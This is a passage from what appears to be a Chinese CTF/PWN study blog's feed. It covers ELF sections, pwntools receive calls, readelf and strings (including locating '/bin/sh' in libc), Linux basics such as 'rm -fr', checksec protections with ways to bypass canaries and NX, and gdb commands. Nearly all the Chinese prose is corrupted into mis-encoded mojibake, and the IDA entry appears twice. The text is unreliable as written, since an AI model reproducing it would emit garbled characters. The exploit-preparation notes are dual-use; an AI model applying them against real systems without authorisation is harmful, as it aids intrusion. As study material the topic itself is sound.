)æ®µæ˜¯å…¨å±€å˜é‡æ•°æ®æ®µã€‚å®ƒç”¨æ¥å­˜æ”¾æœªåˆå§‹åŒ–çš„ï¼ˆuninitailizedï¼‰å…¨å±€å˜é‡ï¼ˆglobalï¼‰å’Œæœªåˆå§‹åŒ–çš„é™æ€å˜é‡</p><p>ä¾‹å¦‚ï¼š</p></li></ul><p><img src="/images/IDA1.png" alt="IDA1"></p><p><img src="/images/IDA2.png" alt="IDA2"></p><p>ä»£è¡¨pwnmeï¼ˆæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼‰çš„åœ°å€</p><p><img src="/images/IDA3.png" alt="IDA3"></p><p>ä»£è¡¨å°†dsèµ‹å€¼ç»™eaxå¯„å­˜å™¨çš„ç¨‹åºä»£ç çš„åœ°å€</p><h2><span id="0x005-p3264ä¸u3264çš„åŒºåˆ«">0x005 p32ï¼ˆ64ï¼‰ä¸u32ï¼ˆ64ï¼‰çš„åŒºåˆ«</span></h2><p>p32æ˜¯äººå‘ç»™æœºå™¨</p><p>u32æ˜¯æœºå™¨å‘ç»™æœºå™¨</p><h2><span id="0x006-precv4ä¸precv4çš„åŒºåˆ«">0x006 p.recv(4)ä¸p.recv()[:4]çš„åŒºåˆ«</span></h2><p>p.recv(4)è¡¨ç¤ºæ¥å—å­—ç¬¦æ•°ä¸º4</p><p>p.recv()[:4]è¡¨ç¤ºæ¥æ”¶åˆ°ç¬¬å››ä¸ªå­—ç¬¦</p><p>p.recv()[2:4]è¡¨ç¤ºä»ç¬¬äºŒä¸ªå­—ç¬¦æ¥æ”¶åˆ°ç¬¬å››ä¸ªå­—ç¬¦</p><p>p.recv()[:-1]è¡¨ç¤ºä¸€ç›´æ¥æ”¶</p><p>p.recvuntil(\n)[:-1]ä»£è¡¨æ¥æ”¶é™¤å»\nçš„æ‰€æœ‰æ•°</p><h2><span id="0x007">0x007</span></h2><p>str()å°†æ‹¬å·å†…çš„ä¸œè¥¿æ‰“åŒ…æˆå­—ç¬¦ä¸²</p><p>int( ,16)å°†æ‹¬å·å†…ä¸œè¥¿æ‰“åŒ…æˆ16è¿›åˆ¶æ•°</p><h2><span id="0x008-å¯„å­˜å™¨ä¸åç§»åœ°å€">0x008 å¯„å­˜å™¨ä¸åç§»åœ°å€</span></h2><p><strong>ä»€ä¹ˆæ˜¯å¯„å­˜å™¨ï¼Ÿ</strong></p><p>ç»™æœ‰ç‰¹å®šåŠŸèƒ½çš„å†…å­˜å•å…ƒå–ä¸€ä¸ªåˆ«åï¼Œè¿™ä¸ªåˆ«åå°±æ˜¯æˆ‘ä»¬ç»å¸¸è¯´çš„å¯„å­˜å™¨ã€‚</p><p><strong>ä»€ä¹ˆæ˜¯å¯„å­˜å™¨æ˜ å°„ï¼Ÿ</strong></p><p>ç»™å­˜å‚¨å™¨åˆ†é…åœ°å€çš„è¿‡ç¨‹å«å­˜å‚¨å™¨æ˜ å°„ï¼Œå†åˆ†é…ä¸€ä¸ªåœ°å€å«é‡æ˜ å°„ã€‚</p><p><strong>ä»€ä¹ˆæ˜¯åç§»åœ°å€ï¼Ÿ</strong></p><p>åç§»åœ°å€æ˜¯è®¡ç®—æœºé‡Œçš„å†…å­˜åˆ†æ®µåï¼Œåœ¨æ®µå†…æŸä¸€åœ°å€ç›¸å¯¹äºæ®µé¦–åœ°å€ï¼ˆæ®µåœ°å€ï¼‰çš„åç§»é‡ã€‚åç§»åœ°å€ä¹Ÿæˆä¸ºåç§»é‡</p><p>æœ‰æ•ˆåœ°å€ = åŸºåœ°å€ + åç§»åœ°å€</p><h2><span id="0x009-readelf">0x009 readelf</span></h2><p>ç”¨äºè§£æELFæ ¼å¼ç›®æ ‡æ–‡ä»¶çš„ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s libc_32.so.6|grep å‡½æ•°å</span><br></pre></td></tr></table></figure><p>å¯æŸ¥æ‰¾å‡½æ•°åœ¨libcä¸­çš„åœ°å€</p><p>ä¸åŒçš„ â€-xâ€œä¼šæœ‰ä¸åŒçš„ç”¨æ³•</p><h2><span id="0x010-strings">0x010 strings</span></h2><p>ç”¨äºåœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼ˆELFï¼‰æŸ¥æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸²</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -at x libc_32.so.6|grep &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>å¯æŸ¥æ‰¾â€/bin/shâ€œçš„åœ°å€</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA</title>
      <link href="/2021/01/26/IDA/"/>
      <url>/2021/01/26/IDA/</url>
      
        <content type="html"><![CDATA[<p>åŸåšå®¢ï¼š<a href="https://blog.csdn.net/qq_27350133/article/details/103796444">https://blog.csdn.net/qq_27350133/article/details/103796444</a></p><h1><span id="text-data-bssç­‰çš„åŒºåˆ«">.text .data .bssç­‰çš„åŒºåˆ«</span></h1><ul><li><p>.textæ®µæ˜¯ä»£ç æ®µã€‚å®ƒç”¨æ¥æ”¾ç¨‹åºä»£ç ï¼ˆcodeï¼‰ã€‚å®ƒé€šå¸¸æ˜¯åªè¯»çš„ï¼ˆç¨‹åºä»£ç ï¼Œç¼–è¯‘å¥½äº†å°±ç¡®å®šäº†ï¼Œä¸å¯èƒ½æ”¹æ¥æ”¹å»çš„å˜›ï¼‰ã€‚</p></li><li><p>.data(ZI data)æ®µæ˜¯æ•°æ®æ®µã€‚å®ƒç”¨æ¥å­˜æ”¾åˆå§‹åŒ–äº†çš„ï¼ˆinitailizedï¼‰å…¨å±€å˜é‡ï¼ˆglobalï¼‰å’Œåˆå§‹åŒ–äº†çš„é™æ€å˜é‡ï¼ˆstaticï¼‰ã€‚å®ƒæ˜¯å¯è¯»å¯å†™çš„ã€‚</p></li><li><p>.bss(RW data )æ®µæ˜¯å…¨å±€å˜é‡æ•°æ®æ®µã€‚å®ƒç”¨æ¥å­˜æ”¾æœªåˆå§‹åŒ–çš„ï¼ˆuninitailizedï¼‰å…¨å±€å˜é‡ï¼ˆglobalï¼‰å’Œæœªåˆå§‹åŒ–çš„é™æ€å˜é‡</p><p>ä¾‹å¦‚ï¼š</p></li></ul><p><img src="/images/IDA1.png" alt="IDA1"></p><p><img src="/images/IDA2.png" alt="IDA2"></p><p>ä»£è¡¨pwnmeï¼ˆæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼‰çš„åœ°å€</p><p><img src="/images/IDA3.png" alt="IDA3"></p><p>ä»£è¡¨å°†dsèµ‹å€¼ç»™eaxå¯„å­˜å™¨çš„ç¨‹åºä»£ç çš„åœ°å€</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LinuxåŸºæœ¬æ“ä½œ</title>
      <link href="/2021/01/24/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/01/24/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>åŸåšå®¢ï¼š<a href="https://blog.csdn.net/qq_41923771/article/details/81452529">https://blog.csdn.net/qq_41923771/article/details/81452529</a></p><p><a href="https://blog.csdn.net/niexinming/article/details/78814422">https://blog.csdn.net/niexinming/article/details/78814422</a></p><h1><span id="ä»€ä¹ˆæ˜¯linux">ä»€ä¹ˆæ˜¯Linux</span></h1><p>Linuxåœ¨æ“ä½œä½¿ç”¨ä¸­æ—¶é€šè¿‡ è¾“å…¥å‘½ä»¤â€”â€”shellè§£é‡Šâ€”â€”å†…æ ¸å¤„ç†</p><p>Linuxçš„å†…æ ¸ä¸€èˆ¬åŒ…å«äº”å¤§éƒ¨åˆ†ï¼šè¿›ç¨‹ç®¡ç†ã€å­˜å‚¨ç®¡ç†ã€æ–‡ä»¶ç®¡ç†ã€è®¾å¤‡ç®¡ç†å’Œç½‘ç»œç®¡ç†ï¼Œæ˜¯ä¸€ç»„ç¨‹åºæ¨¡å—ï¼Œå…·æœ‰è®¿é—®ç¡¬ä»¶è®¾å¤‡å’Œæ‰€æœ‰ä¸»å­˜ç©ºé—´çš„æƒé™ï¼Œæ˜¯ä»…æœ‰çš„èƒ½å¤Ÿæ‰§è¡Œç‰¹æƒæŒ‡ä»¤çš„ç¨‹åºã€‚ä¸»è¦åŠŸèƒ½æ˜¯ï¼šèµ„æºæŠ½è±¡ã€èµ„æºåˆ†é…ã€èµ„æºå…±äº«ã€‚ï¼ˆç›¸å½“äºLinuxçš„æ ¸å¿ƒæ‰€åœ¨ï¼‰</p><p>shellä½œç”¨ï¼š</p><p>å†…æ ¸æ˜¯ å¦‚ä½•å¯¹èµ„æºè¿›è¡Œåˆç†çš„åˆ†é… å’Œ å¦‚ä½•å¯¹ç”¨æˆ·éœ€è¦ä½œå‡ºå¤„ç† ï¼Œ</p><p>1.æ‰€æœ‰çš„è¦æ‰§è¡Œçš„è¿›ç¨‹éƒ½è¦å’Œshellå»ºç«‹è¿æ¥ï¼Œshellç›¸å½“äºLinuxå†…æ ¸å’Œå¤–ç•Œæ²Ÿé€šçš„å”¯ä¸€é€”å¾„ï¼Œshellé€šè¿‡åˆ†ææ‰€æœ‰è¿›ç¨‹çš„é‡è¦æ€§æ¥å¯¹å„ä¸ªè¿›ç¨‹çš„å…ˆåé¡ºåºè¿›è¡Œåˆç†åŒ–åˆ†é…ï¼Œä»è€Œä½¿å¾—ç³»ç»Ÿæ›´åŠ é«˜æ•ˆ</p><p>2.å½“å®¢æˆ·å¯¹å†…æ ¸å‘å‡ºæŒ‡ä»¤æ—¶ï¼Œshellå°†ä¼šå°†å®¢æˆ·æ‰€å‘å‡ºçš„æŒ‡ä»¤è¿›è¡Œç±»ä¼¼ç¿»è¯‘åå‘Šè¯‰å†…æ ¸ï¼Œå†…æ ¸åœ¨æ‰§è¡Œç›¸åº”çš„å‘½ä»¤</p><p>3.shellåœ¨æµç¨‹ä¸­ä¹Ÿèµ·åˆ°äº†å¯¹å†…æ ¸ä½œä¿æŠ¤çš„ä½œç”¨ï¼Œå°†å¤–ç•ŒæŒ‡ä»¤çš„å®‰å…¨æ€§è¿›è¡Œäº†å¤„ç†ï¼Œå†…æ ¸åªéœ€è¦æ‰§è¡Œshellä¼ å‡ºæ¥çš„æŒ‡ä»¤å³å¯ï¼Œå¢åŠ äº†å·¥ä½œæ•ˆç‡</p><hr><h1><span id="linuxå¸¸ç”¨åŸºç¡€æŒ‡ä»¤">Linuxå¸¸ç”¨åŸºç¡€æŒ‡ä»¤</span></h1><h2><span id="1å‘½ä»¤è¡Œè¡Œæç¤ºç¬¦å«ä¹‰">1.å‘½ä»¤è¡Œè¡Œæç¤ºç¬¦å«ä¹‰ï¼š</span></h2><p><img src="https://img-blog.csdn.net/20180806141908806?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="a"></p><p>kiosk:                       ç”¨æˆ·åç§°ï¼ˆrootåˆ™è¡¨ç¤ºä¸ºè¶…çº§ç”¨æˆ·ï¼‰</p><p>@ï¼š                          åˆ†éš”ç¬¦</p><p>foundation31ï¼š     ä¸»æœºåç§°</p><p>~:                              å½“å‰æ‰€åœ¨ç³»ç»Ÿç›®å½•ï¼ˆè¾“å…¥pwdï¼Œå¯ä»¥æ˜¾ç¤ºå½“å…ˆç›®å½•ï¼Œï½ä¸ºé»˜è®¤ï¼Œ å¦‚æœåˆ‡æ¢ç›®å½•åˆ™ä¼šç›¸åº”çš„æ”¹                                 å˜ï¼‰</p><h2><span id="2è¶…çº§ç”¨æˆ·ç™»å½•">2.è¶…çº§ç”¨æˆ·ç™»å½•</span></h2><p>åœ¨å‘½ä»¤è¡Œè¾“å…¥ su</p><p>å†è¾“å…¥å¯†ç ï¼Œç™»é™†æˆåŠŸåå‘½ä»¤æç¤ºç¬¦å°†ä¼šæ”¹å˜ä¸ºrootç”¨æˆ·ï¼Œèº«ä»½æç¤ºç¬¦å˜ä¸º#</p><p><img src="https://img-blog.csdn.net/20180806143127448?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="b"></p><h2><span id="3linuxç³»ç»Ÿç»“æ„">3.Linuxç³»ç»Ÿç»“æ„</span></h2><p><img src="https://img-blog.csdn.net/2018080712321854?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p>ç³»ç»Ÿç›®å½•å„ä¸ªæ–‡ä»¶å¤¹ä»‹ç»ï¼š</p><p> /bin     ##äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç³»ç»Ÿå¸¸è§„å‘½ä»¤<br> /boot     ##ç³»ç»Ÿå¯åŠ¨åˆ†åŒºï¼Œç³»ç»Ÿå¯åŠ¨æ—¶è¯»å–çš„æ–‡ä»¶<br> /dev     ##è®¾å¤‡æ–‡ä»¶<br> /etc     ##å¤§å¤šæ•°é…ç½®æ–‡ä»¶<br> /home     ##æ™®é€šç”¨æˆ·çš„å®¶ç›®å½•<br> /lib     ##32ä½å‡½æ•°åº“<br> /lib64     ##64ä½åº“<br> /media     ##æ‰‹åŠ¨ä¸´æ—¶æŒ‚è½½ç‚¹<br> /mnt     ##æ‰‹åŠ¨ä¸´æ—¶æŒ‚è½½ç‚¹<br> /opt     ##ç¬¬ä¸‰æ–¹è½¯ä»¶å®‰è£…ä½ç½®<br> /proc     ##è¿›ç¨‹ä¿¡æ¯åŠç¡¬ä»¶ä¿¡æ¯<br> /root     ##è¶…çº§ç”¨æˆ·å®¶ç›®å½•<br> /run     ##ä¸´æ—¶è®¾å¤‡çš„é»˜è®¤æŒ‚è½½ç‚¹<br> /sbin     ##ç³»ç»Ÿç®¡ç†å‘½ä»¤<br> /srv     ##æ•°æ®<br> /var     ##æ•°æ®<br> /sys     ##å†…æ ¸ç›¸å…³ä¿¡æ¯<br> /tmp     ##ä¸´æ—¶æ–‡ä»¶<br> /usr     ##ç”¨æˆ·ç›¸å…³è®¾å®š</p><h2><span id="4linuxä¸‹çš„æ–‡ä»¶ç®¡ç†">4.Linuxä¸‹çš„æ–‡ä»¶ç®¡ç†</span></h2><h3><span id="1å»ºç«‹ç©ºç™½æ–‡ä»¶">1.å»ºç«‹ç©ºç™½æ–‡ä»¶</span></h3><p>touch file                å»ºç«‹ç©ºæ–‡ä»¶ï¼Œæˆ–ä¿®æ”¹æ–‡ä»¶çš„æ—¶é—´æˆ³<br>touch file1 file2     å»ºç«‹å¤šä¸ªæ–‡ä»¶ï¼ˆfile1 file2ï¼‰</p><p><img src="https://img-blog.csdn.net/20180807123424400?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3><span id="2å»ºç«‹æ–‡ä»¶å¤¹">2ï¼šå»ºç«‹æ–‡ä»¶å¤¹</span></h3><p>mkdir        ##å»ºç«‹å•ç›®å½•<br>mkdir -p   ##å»ºç«‹å¤šå±‚ç›®å½•</p><p>egï¼šmkdir -p 123/456/789   åœ¨Desktopä¸­åˆ›å»º123æ–‡ä»¶å¤¹ï¼Œåœ¨123ä¸­åˆ›å»º456æ–‡ä»¶å¤¹ï¼Œåœ¨456ä¸­åˆ›å»º789æ–‡ä»¶å¤¹</p><p>å®ç°äº†æ–‡ä»¶å¤¹çš„å¤šçº§ç›®å½•åˆ›å»º</p><p><img src="https://img-blog.csdn.net/20180807123521110?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3><span id="3æ–‡ä»¶å¤¹çš„åˆ é™¤">3ï¼šæ–‡ä»¶å¤¹çš„åˆ é™¤</span></h3><p>rm file           åˆ é™¤fileæ–‡ä»¶å¤¹ï¼Œä½†æ˜¯ä¼šæç¤ºæ˜¯å¦åˆ é™¤ï¼Œé€‰æ‹©yesæˆ–è€…no</p><p>rm  -f file      å¼ºè¡Œåˆ é™¤æ–‡ä»¶ä¸æç¤º<br>rm  -fr file    åˆ é™¤å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶,è¿™ä¸ªå‘½ä»¤å¾ˆå±é™©ï¼Œåº”é¿å…ä½¿ç”¨ã€‚<br>                     æ‰€åˆ é™¤çš„æ–‡ä»¶ï¼Œä¸€èˆ¬éƒ½ä¸èƒ½æ¢å¤ï¼</p><p><img src="https://img-blog.csdn.net/20180807123902711?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><h3><span id="4æ–‡ä»¶çš„ç¼–è¾‘">4:æ–‡ä»¶çš„ç¼–è¾‘</span></h3><p><strong>step1</strong>:  vim file        è¿›å…¥fileæ–‡ä»¶ç¼–è¯‘</p><p><img src="https://img-blog.csdn.net/20180807124020324?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><strong>step2</strong>: è¿›å…¥æ–‡ä»¶åè¾“å…¥&lt; I &gt;è¿›å…¥æ–‡ä»¶è¾“å…¥æ¨¡å¼ï¼Œå¯ä»¥å‘æ–‡ä»¶ä¸­è¾“å…¥å†…å®¹</p><p><img src="https://img-blog.csdn.net/20180807124144112?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxOTIzNzcx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><strong>step3</strong>ï¼šé€€å‡ºç¼–è¯‘æ¨¡å¼</p><p>æŒ‰<esc>é€€å‡ºæ’å…¥ç¼–è¯‘æ¨¡å¼ï¼Œè¿›å…¥æµè§ˆæ¨¡å¼</esc></p><p><strong>step4</strong>ï¼šæ–‡ä»¶çš„é€€å‡º</p><p>åœ¨æµè§ˆæ¨¡å¼ä¸‹è¾“å…¥ï¼š</p><p>:q      ##å½“æ–‡ä»¶æ²¡æœ‰åšä»»ä½•ä¿®æ”¹æ˜¯å¯ç”¨<br>:q!     ##å½“æ–‡ä»¶ä¿®æ”¹ä½†ä¸è¡Œä¿å­˜ä¿®æ”¹æ—¶å¯ç”¨<br>:wq   ##é€€å‡ºä¿å­˜ï¼ˆä¸€èˆ¬ç”¨è¿™ä¸ªï¼‰<br>:wq!  ##å½“æ–‡ä»¶å±äºè‡ªå·±æˆ–ç”¨æˆ·ä¸ºrootæ—¶å¯ç”¨</p><h3><span id="5æ–‡ä»¶æŸ¥çœ‹">5.æ–‡ä»¶æŸ¥çœ‹</span></h3><p>æ–‡ä»¶æŸ¥çœ‹å¸¸ç”¨æŒ‡ä»¤</p><p>cat file             è¾“å‡ºæ–‡ä»¶çš„æ‰€æœ‰å†…å®¹</p><p><img src="/images/Linux1.png" alt="Linux1"></p><p><img src="/images/Linux2.png" alt="Linux2"></p><h3><span id="6æ–‡ä»¶è·¯å¾„">6.æ–‡ä»¶è·¯å¾„</span></h3><p><strong>ç›¸å¯¹è·¯å¾„</strong>ï¼šï¼ˆåˆ™å¿…é¡»æœ‰å‰ææ¡ä»¶ï¼Œå…¶å®åœ¨ç³»ç»Ÿåº•å±‚ä¾ç„¶æ˜¯ç»å¯¹è·¯å¾„æ‰§è¡Œï¼Œåªæ˜¯ç”¨æˆ·çœ‹åˆ°çš„ç®€ç•¥ç§»åŠ¨ï¼‰</p><p>   æ–‡ä»¶ç›¸å¯¹å½“å‰ç³»ç»Ÿä½ç½®çš„ä¸€ä¸ªåç§°ç®€å†™<br>   æ–‡ä»¶åç§°çœç•¥äº†å½“å‰è·¯å¾„çš„å€¼<br>   åªæœ‰å½“å‰åœ¨æ­¤ç›®å½•ä¸­æ—¶å¯ä»¥ä½¿ç”¨<br>   æ–‡ä»¶åç§°ä¸ä»¥/å¼€å¤´<br>   æ–‡ä»¶åç§°ä¼šè‡ªåŠ¨åœ¨å­—ç¬¦å‰åŠ å…¥â€™pwdâ€™æ˜¾ç¤ºçš„è·¯å¾„</p><p><strong>ç»å¯¹è·¯å¾„</strong>ï¼š</p><p> æ˜¯æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­çœŸå®çš„ä½ç½®<br> ä»»ä½•æ—¶é—´éƒ½å¯ä»¥ç²¾ç¡®è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶çš„åç§°<br> æ–‡ä»¶åç§°ä»¥/å¼€å¤´</p><p>pwd           æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•<br> cd              åˆ‡æ¢å½“å‰å·¥ä½œç›®å½•<br> cd /mnt    åˆ‡æ¢åˆ°/mntç›®å½•ä¸­<br> cd -           è¿›å…¥å½“å‰ç›®å½•ä¹‹å‰æ‰€åœ¨ç›®å½•ä¸­</p><p> ls               æŸ¥çœ‹æ–‡ä»¶å¤¹é‡Œçš„æ‰€æœ‰æ–‡ä»¶</p><p><strong>ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„è¡¥å……</strong>ï¼š</p><p><img src="/images/Linux3.png" alt="Linux3"></p><h2><span id="5å¸¸ç”¨æŒ‡ä»¤åˆé›†">5.å¸¸ç”¨æŒ‡ä»¤åˆé›†</span></h2><p>æ ‡å‡†æ ¼å¼ï¼šå‘½ä»¤åç§°  [å‘½ä»¤å‚æ•°]  [å‘½ä»¤å¯¹è±¡]</p><p> ls              åˆ—å‡ºæ–‡ä»¶ä¿¡æ¯</p><p> cd            åˆ‡æ¢å·¥ä½œç›®å½•</p><p>pwd         æ˜¾ç¤ºå½“å‰ç›®å½•</p><p>cp             å¤åˆ¶</p><p>rm            åˆ é™¤</p><p>nc             å»ºç«‹TCP/UDPé“¾æ¥å¹¶ç›‘å¬</p><p>su             åˆ‡æ¢åˆ°è¶…çº§ç”¨æˆ·</p><p>touch       åˆ›å»ºæ–‡ä»¶</p><p>mkdir       åˆ›å»ºç›®å½•</p><hr><h1><span id="linuxamppwn">Linux&amp;PWN</span></h1><h2><span id="pwnæ˜¯ä»€ä¹ˆ">PWNæ˜¯ä»€ä¹ˆ</span></h2><p>åœ¨å®‰å…¨é¢†åŸŸä¸­æŒ‡çš„æ˜¯é€šè¿‡äºŒè¿›åˆ¶/ç³»ç»Ÿè°ƒç”¨ç­‰æ–¹å¼è·å¾—ç›®æ ‡ä¸»æœºçš„shell</p><h2><span id="0x01-linuxä¸‹çš„pwnå¸¸ç”¨åˆ°çš„å·¥å…·">0x01 Linuxä¸‹çš„pwnå¸¸ç”¨åˆ°çš„å·¥å…·ï¼š</span></h2><p> ï¼ˆ1ï¼‰gdbï¼šLinuxè°ƒè¯•ä¸­å¿…è¦ç”¨åˆ°çš„<br> ï¼ˆ2ï¼‰gdb-pedaï¼šgdbæ–¹ä¾¿è°ƒè¯•çš„å·¥å…·ï¼Œç±»ä¼¼çš„å·¥å…·æœ‰gefï¼Œgdbinitï¼Œè¿™äº›å·¥å…·çš„å®‰è£…å¯ä»¥å‚è€ƒï¼š<a href="http://blog.csdn.net/gatieme/article/details/63254211">http://blog.csdn.net/gatieme/article/details/63254211</a><br> ï¼ˆ3ï¼‰pwntools:å†™expå’Œpocçš„åˆ©å™¨<br> ï¼ˆ4ï¼‰checksecï¼šå¯ä»¥å¾ˆæ–¹ä¾¿çš„çŸ¥é“elfç¨‹åºçš„å®‰å…¨æ€§å’Œç¨‹åºçš„è¿è¡Œå¹³å°<br> ï¼ˆ5ï¼‰objdumpå’Œreadelfï¼šå¯ä»¥å¾ˆå¿«çš„çŸ¥é“elfç¨‹åºä¸­çš„å…³é”®ä¿¡æ¯<br> ï¼ˆ6ï¼‰ida pro ï¼šå¼ºå¤§çš„åç¼–è¯‘å·¥å…·<br> ï¼ˆ7ï¼‰ROPgadgetï¼šå¼ºå¤§çš„ropåˆ©ç”¨å·¥å…·<br> ï¼ˆ8ï¼‰one_gadgetï¼šå¯ä»¥å¿«é€Ÿçš„å¯»æ‰¾libcä¸­çš„è°ƒç”¨exec(â€˜bin/shâ€™)çš„ä½ç½®<br> ï¼ˆ9ï¼‰libc-databaseï¼š å¯ä»¥é€šè¿‡æ³„éœ²çš„libcçš„æŸä¸ªå‡½æ•°åœ°å€æŸ¥å‡ºè¿œç¨‹ç³»ç»Ÿæ˜¯ç”¨çš„å“ªä¸ªlibcç‰ˆæœ¬ </p><h2><span id="0x02-æ£€æµ‹elfçš„å®‰å…¨æ€§">0x02 æ£€æµ‹elfçš„å®‰å…¨æ€§</span></h2><p>æ‹¿åˆ°eflï¼Œé¦–å…ˆè¦ç”¨checksecæ¥æ£€æµ‹elfè¿è¡Œäºå“ªä¸ªå¹³å°ï¼Œå¼€å¯äº†ä»€ä¹ˆå®‰å…¨æªæ–½ï¼Œå¦‚æœç”¨gccçš„ç¼–è¯‘åï¼Œé»˜è®¤ä¼šå¼€å¯æ‰€æœ‰çš„å®‰å…¨æªæ–½ã€‚ </p><p> ã€1ã€‘RELROï¼šRELROä¼šæœ‰Partial RELROå’ŒFULL RELROï¼Œå¦‚æœå¼€å¯FULL RELROï¼Œæ„å‘³ç€æˆ‘ä»¬<strong>æ— æ³•ä¿®æ”¹gotè¡¨</strong><br> ã€2ã€‘Stackï¼šå¦‚æœæ ˆä¸­å¼€å¯Canary foundï¼Œé‚£ä¹ˆå°±<strong>ä¸èƒ½ç”¨ç›´æ¥ç”¨æº¢å‡ºçš„æ–¹æ³•è¦†ç›–æ ˆä¸­è¿”å›åœ°å€</strong>ï¼Œè€Œä¸”è¦é€šè¿‡æ”¹å†™æŒ‡é’ˆä¸å±€éƒ¨å˜é‡ã€leak canaryã€overwrite canaryçš„æ–¹æ³•æ¥ç»•è¿‡<br> ã€3ã€‘NXï¼šNX enabledå¦‚æœè¿™ä¸ªä¿æŠ¤å¼€å¯å°±æ˜¯æ„å‘³ç€<strong>æ ˆä¸­æ•°æ®æ²¡æœ‰æ‰§è¡Œæƒé™</strong>ï¼Œä»¥å‰çš„ç»å¸¸ç”¨çš„call espæˆ–è€…jmp espçš„æ–¹æ³•å°±ä¸èƒ½ä½¿ç”¨ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ropè¿™ç§æ–¹æ³•ç»•è¿‡<br> ã€4ã€‘PIEï¼šPIE enabledå¦‚æœç¨‹åºå¼€å¯è¿™ä¸ªåœ°å€éšæœºåŒ–é€‰é¡¹å°±æ„å‘³ç€<strong>ç¨‹åºæ¯æ¬¡è¿è¡Œçš„æ—¶å€™åœ°å€éƒ½ä¼šå˜åŒ–</strong>ï¼Œè€Œå¦‚æœæ²¡æœ‰å¼€PIEçš„è¯é‚£ä¹ˆNo PIE (0x400000)ï¼Œæ‹¬å·å†…çš„æ•°æ®å°±æ˜¯ç¨‹åºçš„åŸºåœ°å€ </p><p> ã€5ã€‘ Arch: æŸ¥çœ‹æ“ä½œæ•°</p><p><img src="/images/Linux4.png" alt="Linux4"></p><h2><span id="0x03-è°ƒè¯•æŠ€å·§">0x03 è°ƒè¯•æŠ€å·§</span></h2><p>gdbå¸¸ç”¨çš„è°ƒè¯•æŒ‡ä»¤ï¼š<br> nï¼š æ‰§è¡Œä¸€è¡Œæºä»£ç ä½†ä¸è¿›å…¥å‡½æ•°å†…éƒ¨<br> <strong>ni: æ‰§è¡Œä¸€è¡Œæ±‡ç¼–ä»£ç ä½†ä¸è¿›å…¥å‡½æ•°å†…éƒ¨</strong><br> sï¼š æ‰§è¡Œä¸€è¡Œæºä»£ç è€Œä¸”è¿›å…¥å‡½æ•°å†…éƒ¨<br> <strong>si: æ‰§è¡Œä¸€è¡Œæ±‡ç¼–ä»£ç è€Œä¸”è¿›å…¥å‡½æ•°å†…éƒ¨</strong><br> c: ç»§ç»­æ‰§è¡Œåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹<br> *<em>b <em>åœ°å€: ä¸‹æ–­ç‚¹</em></em><br> directory+æºç æ‰€åœ¨ç›®å½•ï¼šåŠ è½½ç¨‹åºæºç <br> set follow-fork-mode parent ï¼šåªè°ƒè¯•ä¸»è¿›ç¨‹<br> stack: æ˜¾ç¤ºæ ˆä¿¡æ¯<br> x ï¼š æŒ‰åå…­è¿›åˆ¶æ ¼å¼æ˜¾ç¤ºå†…å­˜æ•°æ®ï¼Œå…¶ä¸­x/{å­—èŠ‚æ•°}x ä»¥16è¿›åˆ¶æ˜¾ç¤ºæŒ‡å®šåœ°å€å¤„çš„æ•°æ®;{å­—èŠ‚æ•°}è¡¨ç¤ºå­—èŠ‚æ•°åˆ¶å®šï¼ˆb å•å­—èŠ‚ï¼›h åŒå­—èŠ‚ï¼›w å››å­—èŠ‚ï¼›g å…«å­—èŠ‚ï¼›é»˜è®¤ä¸ºå››å­—èŠ‚ï¼‰ 